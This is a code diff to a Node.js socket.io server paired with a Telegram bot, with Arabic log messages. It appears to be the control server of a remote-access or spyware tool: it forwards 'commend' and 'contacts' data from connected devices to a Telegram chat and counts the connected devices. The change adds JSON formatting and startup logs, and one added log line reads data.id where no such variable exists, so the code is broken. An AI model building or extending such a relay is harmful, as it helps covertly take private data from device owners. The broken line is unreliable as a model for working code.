@@ -90,7 +90,7 @@ io.on('connection', (socket) => {
     });
 
     socket.on('commend', (data) => {
-        bot.sendMessage(data.id, '<b>رسالة مستلمة من → ' + deviceId + '</b>\n' + data, { parse_mode: 'HTML' });
+        bot.sendMessage(data.id, '<b>رسالة مستلمة من → ' + deviceId + '</b>\n' + JSON.stringify(data), { parse_mode: 'HTML' });
     });
     
     socket.on('contacts', (data) => {
@@ -790,5 +790,7 @@ setInterval(() => {
 }, 300000);
 
 server.listen(process.env.PORT || 3000, () => {
-    console.log('البوت يعمل على المنفذ 3000');
+    console.log('✅ البوت يعمل على المنفذ 3000');
+    console.log('✅ معرف البوت:', data.id);
+    console.log('✅ عدد الأجهزة المتصلة:', io.engine.clientsCount);
 });
